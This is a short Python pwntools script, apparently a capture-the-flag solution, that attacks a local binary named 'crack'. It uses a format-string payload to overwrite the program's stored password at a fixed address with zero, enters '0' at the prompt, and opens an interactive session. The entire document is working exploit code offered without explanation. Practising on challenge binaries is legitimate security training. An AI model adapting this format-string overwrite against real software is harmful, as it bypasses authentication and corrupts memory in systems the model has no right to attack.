from pwn import *


s = process("./crack")

elf = ELF("./crack")

password = 0x0804A048

pay = fmtstr_payload(10,{password:0})

print pay

s.recvuntil("?")

s.send(pay)

s.recvuntil(":")

s.send("0")


s.interactive()
